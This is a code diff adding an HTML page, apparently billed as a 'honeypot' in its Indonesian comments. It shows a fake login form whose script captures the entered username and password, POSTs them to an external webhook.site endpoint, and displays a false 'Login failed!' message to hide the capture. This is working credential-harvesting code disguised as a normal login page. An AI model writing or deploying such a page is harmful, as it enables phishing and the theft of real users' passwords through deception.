@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <!-- FORM PALSU -->
+    <form id="honeypot">
+      <input name="username" placeholder="Username" />
+      <input name="password" type="password" />
+      <button type="submit">Login</button>
+    </form>
+
+    <script>
+      document.getElementById('honeypot').onsubmit = function(e) {
+          e.preventDefault();
+          const data = {
+              user: this.username.value,
+              pass: this.password.value,
+              time: new Date().toISOString(),
+            //   ip: '<?php echo $_SERVER['REMOTE_ADDR']; ?>' // jika pakai PHP
+          };
+
+          // Kirim ke server intel
+          fetch('https://webhook.site/01b31fa9-90d8-4a97-a4c0-00b3643b1ff4', {
+              method: 'POST',
+              body: JSON.stringify(data)
+          });
+
+          alert('Login gagal!'); // Umpan balik palsu
+          this.reset();
+      };
+    </script>
+  </body>
+</html>
